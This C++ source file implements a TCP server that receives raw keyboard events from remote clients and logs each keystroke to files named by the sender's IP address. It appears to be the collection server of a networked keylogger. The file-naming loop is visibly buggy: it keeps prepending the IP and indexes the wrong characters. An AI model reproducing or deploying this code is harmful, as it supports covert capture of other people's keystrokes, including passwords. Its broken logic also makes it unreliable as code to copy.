#include "pch.h"

//XX - save bytes to the number of the log
#define LOG_NAME "-logXX.txt"

/*
This function handle client connection.
input:
socket - the client socket.
output: null.
*/
void client_handle(int socket){
    struct input_event event;
    
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    std::fstream file;
    string filename = LOG_NAME;

    //get the client ip
    if (getpeername(socket, (struct sockaddr *)&client_addr, &addr_len) == -1) {
        std::cerr << "getpeername failed" << std::endl;
        close(socket);
        return;
    }

    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_addr.sin_addr), ip_str, INET_ADDRSTRLEN);

    //read struct input_event from the client
    if (read(socket, &event, sizeof(struct input_event)) < 0) {
        std::cerr << "read failed" << std::endl;
        close(socket);
        return;
    }

    string ip = ip_str;

    for(int i = 0; i < 100; i++){
        //generate log file name by its ip and log files counter
        filename[5] = (int)(i % 10) + '0';
        filename[4] = (int)(i / 10) + '0';
        filename = ip + filename;

        file.open(filename, std::ios::in | std::ios::out | std::ios::app); // in = read, out = write, app = append
        streampos write_pos = file.tellp();
        if(write_pos < LOG_FILE_SIZE){
            break;
        }
    }

    if (!file.is_open()) {
        std::cerr << "Failed to open the file: " << filename << std::endl;
        return;
    }


    char code = 0;
    if (event.type == EV_KEY) {
        if (event.value == 1)
            code = event.code;
        else if (event.value == 0)
            code = event.code | RELEASE_CODE;
    }

    key_event key = keyboard_handler(code);
    if (event.value == 1)
        file << key_to_ascii(key);

    //print the client data
    cout << "ip: " << ip << ", key = " << key_to_ascii(key) << endl;

    close(socket);
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    keyboard_init();

    //create socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        std::cerr << "socket failed" << std::endl;
        return 1;
    }

    //attach socket to the port
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        std::cerr << "setsockopt" << std::endl;
        return 1;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    //bind the socket to the address and port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        std::cerr << "bind failed" << std::endl;
        return 1;
    }

    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        std::cerr << "listen" << std::endl;
        return 1;
    }

    while (true) {
        //accept incoming connection
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            std::cerr << "accept" << std::endl;
            continue;
        }


        //handling the client with thread
        thread client(client_handle, new_socket);
        client.detach();
    }

    return 0;
}
